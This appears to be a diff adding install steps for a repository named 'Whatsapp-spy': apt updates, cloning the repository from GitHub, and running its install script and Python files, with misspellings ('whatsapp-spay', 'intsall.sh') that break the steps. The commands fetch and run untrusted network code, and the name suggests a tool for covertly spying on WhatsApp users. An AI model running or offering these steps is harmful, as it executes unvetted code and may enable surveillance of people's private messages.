@@ -1,0 +1,9 @@
+apt update 
+apt upgrade 
+apt install git
+install python
+git clone https://github.com/STARK-404/Whatsapp-spy/
+cd whatsapp-spay
+bash intsall.sh 
+python main.py
+python index.py
